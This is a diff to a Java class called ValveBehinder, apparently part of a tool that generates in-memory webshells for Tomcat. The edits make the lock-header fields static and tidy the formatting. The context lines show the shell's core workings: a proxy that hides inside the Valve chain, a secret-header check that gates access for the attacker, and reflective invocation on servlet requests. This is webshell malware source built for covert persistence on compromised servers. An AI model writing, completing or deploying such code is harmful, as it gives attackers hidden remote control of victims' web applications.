@@ -22,8 +22,8 @@ public class ValveBehinder implements InvocationHandler {
     private static String pass;
     private Object targetObject;
     private Object next;
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public ValveBehinder() {
     }
@@ -39,7 +39,7 @@ public class ValveBehinder implements InvocationHandler {
             return next;
         } else if (method.getName().equals("setNext")) {
             next = args[0];
-        } else{
+        } else {
             return method.invoke(getFieldValue(targetObject, "basic"), args);
         }
         return null;
@@ -49,7 +49,7 @@ public class ValveBehinder implements InvocationHandler {
     private void run(Object servletRequest, Object servletResponse) {
         try {
             String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
             String method = (String) invokeMethod(servletRequest, "getMethod", new Class[]{}, new Object[]{});
@@ -113,7 +113,7 @@ public class ValveBehinder implements InvocationHandler {
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
